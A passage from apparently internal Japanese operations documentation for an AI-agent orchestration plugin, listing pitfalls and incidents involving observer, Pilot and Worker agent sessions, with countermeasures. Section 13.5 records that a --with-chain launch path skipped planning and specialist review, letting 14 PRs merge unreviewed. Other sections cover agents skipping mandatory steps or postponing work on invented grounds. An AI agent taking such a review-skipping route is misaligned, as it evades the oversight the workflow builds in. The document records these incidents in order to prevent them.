|---|---------|----------------------------------|------|
| 13.1 | `spawn-controller.sh co-autopilot` で Issue 単位 Worker を直接起動しようとする | window 名が `wt-co-autopilot-*`（`ap-*` でない）、`issue-N.json` が生成されない、Worker が `/twl:workflow-setup` を実行せずに idle | **Issue 単位 Worker 起動は `autopilot-launch.sh` の責務**。observer は `spawn-controller.sh co-autopilot` で Pilot を spawn し、Worker 起動は Pilot に委譲する |
| 13.2 | Pilot が `autopilot-launch.sh` の代わりに `cld-spawn` を直接呼んで Worker を起動する | Worker の `AUTOPILOT_DIR` / `WORKER_ISSUE_NUM_ENV` が未設定、クラッシュ検知フック非設定、state file missing | `autopilot-launch.sh` 経由必須（環境変数・クラッシュ検知フック・window-manifest を担当） |
| 13.3 | su-observer が Worker window（`ap-*`）に `spawn-controller.sh` を呼んで Pilot を二重起動する | 同一セッションに `ap-*` と `wt-co-autopilot-*` が混在、Pilot 二重起動 | observer が spawn するのは Pilot（`wt-co-autopilot-*`）のみ。Worker（`ap-*`）への介入は `session-comm.sh inject` 経由 |
| 13.4 | `spawn-controller.sh co-autopilot` で起動した Pilot が `issue-N.json` を生成しないまま停滞（chain 不回転の典型） | `.autopilot/issues/issue-N.json` が存在しない、tmux window は存在するが `ap-*` window がない | Pilot が Step 3 `autopilot-init` → Step 4 `autopilot-launch.sh` を実行していることを確認する。state file 未生成なら Pilot session の chain ログを確認し、stuck 箇所を特定して inject で再開 |
| 13.5 | observer が `spawn-controller.sh co-autopilot --with-chain --issue N` を Issue 毎に叩き、Worker を直接 spawn する（「1 Issue = 1 Pilot」錯覚） | `--with-chain` は `autopilot-launch.sh` に直接委譲する skill bypass 経路。Pilot が spawn されないため co-autopilot Step 1-5（deps graph / Wave 計画 / specialist-audit）が全 skip される。Phase Z で 14 PR (#923/#925-#937) が specialist review を経由せずに merge された根本原因 | **正規運用は 1 Pilot = 複数 Issue**。observer は `spawn-controller.sh co-autopilot <prompt>`（`--with-chain` なし）で Pilot を 1 つ spawn し、Pilot が deps graph に基づく Wave 計画と Worker 起動を担当する。`--with-chain --issue N` は autopilot-launch.sh 直接呼出しとほぼ等価であり、observer が使う経路ではない |

**正しい経路選択:**
- observer がユーザー指示で Issue 群を実装させる場合 → `spawn-controller.sh co-autopilot`（経路 B）
- Pilot が個別 Issue の Worker を起動する場合 → `autopilot-launch.sh`（経路 A、`autopilot-launch.md` 経由）
- observer が Worker に直接介入する場合 → `session-comm.sh inject`（`spawn-controller.sh` 経由でない）

詳細: `co-autopilot SKILL.md §Step 3.5 起動経路比較`

---

## 14. git 管理外実行時の pwd フォールバック禁止（#966 文書化）

`chain-runner.sh` の `resolve_project_root()` が `git rev-parse --show-toplevel 2>/dev/null || pwd` を実装していた時期に、Worker の CWD が git 管理外になると `pwd` が project root として誤採用され user-global 書き込みが発生した（Wave AA.3 Phase 1、doobidoo `b81b1962`）。

**症状**: Worker が `~/.claude/plugins/twl/.dev-session/issue-N/` に書き込もうとして permission prompt が発火する。本来の書き込み先は `<worktree>/.dev-session/issue-N/`。

| # | Pitfall | 観察パターン | 対策 |
|---|---------|------------|------|
| 14.1 | `resolve_project_root()` が `\|\| pwd` で CWD を誤 root として採用する | Worker の permission prompt が `~/.claude/plugins/twl/.dev-session/issue-N` への mkdir を要求。CWD が `/tmp` や非 git パスになっている | **`\|\| pwd` は禁止**。ADR-027 の 3 段 fallback（tier 1: CWD rev-parse → tier 2: script-path rev-parse → tier 3: `return 1`）を使うこと |
| 14.2 | Worker CWD が git 管理外になる経路 | `bash -c "cd /tmp && ..."` などで呼び出された chain-runner.sh が tier 1 失敗後に `pwd` = `/tmp` を採用する | tier 2 (script-path fallback) が `BASH_SOURCE[0]` のディレクトリから git rev-parse を試みる。script が worktree 内 symlink 経由で常駐している前提で救済可能 |
| 14.3 | script 自体が worktree 外に配置される異常状態（tier 2 も fail） | script が `/tmp` にコピーされた状態で実行される | tier 3 が `[chain-runner] FATAL: resolve_project_root failed (cwd=..., script=...)` を stderr に出力し `return 1` で abort。誤 root への書き込みは構造的に不可能 |

**正しい設計原則**:
- `resolve_project_root()` で `pwd` を fallback として使ってはならない（ADR-027）
- 他の `resolve_*` 関数（例: `resolve_autopilot_dir()`）でも同様の `|| pwd` fallback は禁止
- 残骸 cleanup: `~/.claude/plugins/twl/.dev-session/` に孤児ファイルが残る場合は `plugins/twl/commands/cleanup-orphan-snapshots.md` の手順を参照

**参照**: ADR-027, Issue #966, Issue #938 (per-issue namespace), doobidoo `b81b1962`

---

## 15. Pilot/co-explore 完遂後の next-step postpone 判断 error（#1085 文書化）

**事象（Wave U、2026-04-29 実例）**: co-explore Phase 2 が `.explore/1023/summary.md`（4 子 Issue 計画確定）で完遂した後、observer が「Phase 1 完遂後まで postpone」と勝手に判断し、next-step（子 Issue 起票）を自律 spawn しなかった。ユーザー指摘で発覚。

### 根本要因

observer が「重要 event 待機」モードに入り **passive 化** し、co-explore 完遂を completion event として能動的に捕捉しなかった。heartbeat-watcher 等の受動的チャネルにのみ依存し、次の依存関係を勝手に発明した:

- `Pilot polling 完了` ではなく `ユーザー入力` を next-step trigger にした
- 「Phase 1 完遂後」など実在しない順序依存を発明した
- observer 自身の heartbeat 更新が silence 検知を reset してしまう構造的盲点を見落とした（Incident 3）

### 検出パターン（MUST）

| # | 症状 | 対策 |
|---|------|------|
| 15.1 | co-explore が `.explore/<N>/summary.md` を生成しても next-step を spawn しない | `.explore/<N>/summary.md` の生成を能動 polling（inotifywait または filesystem check）で検知し、即時 next-step 自律 spawn へ遷移する（§11 クロスリファレンス参照） |
| 15.2 | 実在しない Phase 依存を理由に postpone | postpone は **user 明示指示時のみ**。observer 自身の判断による postpone は **MUST NOT** |
| 15.3 | heartbeat self-update が silence 検知 reset を誤発 | heartbeat ファイルの writer pid と watcher pid を区別。observer 自身の heartbeat 更新は silence reset 対象外とする（`refs/su-observer-supervise-channels.md` 参照） |
| 15.4 | Pilot idle 状態（`Saturated for`/`Worked for` + IDLE prompt）を検知せず | `pilot-completion-signals.md` の PILOT-PHASE-COMPLETE チャネルに加え、co-explore 完遂用 `.explore/<N>/summary.md` 検知を必ず組み合わせる |

### 正しい next-step spawn 手順（MUST）

```
co-explore 完遂（.explore/<N>/summary.md 生成）を検知
→ 5 分以内に next-step（子 Issue 起票 / Wave 計画更新）を自律 spawn する
→ postpone が必要な場合のみ user に明示確認を取る（AskUserQuestion 必須）
```

**MUST NOT**: SU-4 制約（1 session 5 Issue 以内）を確認する前に postpone 判断を下すこと。SU-4 内であれば直接 `gh issue create` で起票可能。

### §11 とのクロスリファレンス

- §11「Observer idle 中の session disconnect 対策」: Monitor heartbeat 欠如が observer 自身の passive 化を招く根本要因の一つ。§11.1 の heartbeat emit ガードと本節の能動 completion 捕捉を組み合わせること。
- co-explore 完遂 → next-step spawn の 5 分タイムアウト規約は `refs/su-observer-wave-management.md` に定義。

**参照**: Issue #1085, Wave U incident 1+3, doobidoo `observer-pitfall` tag

---

## 16. Step 0 MUST refs Read 省略 incident（2026-04-29 ipatho2）

**事象**: observer が workflow 実行前の Step 0 MUST（`refs/refine-processing-flow.md` Read）を省略し、processing flow の全ステップを把握しないまま実装を進めた。

### 根本要因

refs ファイルが `~/.claude/plugins/twl/refs/` ではなく `main/plugins/twl/skills/workflow-issue-refine/refs/` 等 **worktree 配下の実ファイルパス** に配置されているため、Read 先を `claude/` 配下と誤解し、「ファイル不在」として Step 0 を実質スキップした。

### 既知の落とし穴（MUST 確認）

| # | 誤解 | 正しい動作 |
|---|------|-----------|
| 16.1 | `claude/plugins/twl/refs/*.md` を Read しようとする | refs は **worktree の `plugins/twl/` 配下**に存在。`main/plugins/twl/skills/<workflow-name>/refs/` が正規パス |
| 16.2 | `refs/` ファイルが見つからないとスキップする | SKILL.md の Step 0 は **MUST**。不在の場合はパスを確認し直す（絶対パスで再 Read） |
| 16.3 | Step 0 を "init 処理" と混同して後回しにする | Step 0 は最初の実装ステップより**前**に完了させる（MUST 順守） |

### 対策（MUST）

1. workflow SKILL.md に `Step 0: Read refs/xxx.md` が記載されていれば、**必ず絶対パスで Read** する
2. 絶対パス解決: `$(git rev-parse --show-toplevel)/plugins/twl/skills/<workflow>/refs/<file>.md`
3. Read 失敗時はパスを変えて再試行し、スキップしない

**参照**: Issue #1118, doobidoo hash `e73fc1fe`, `observer-pitfall` tag
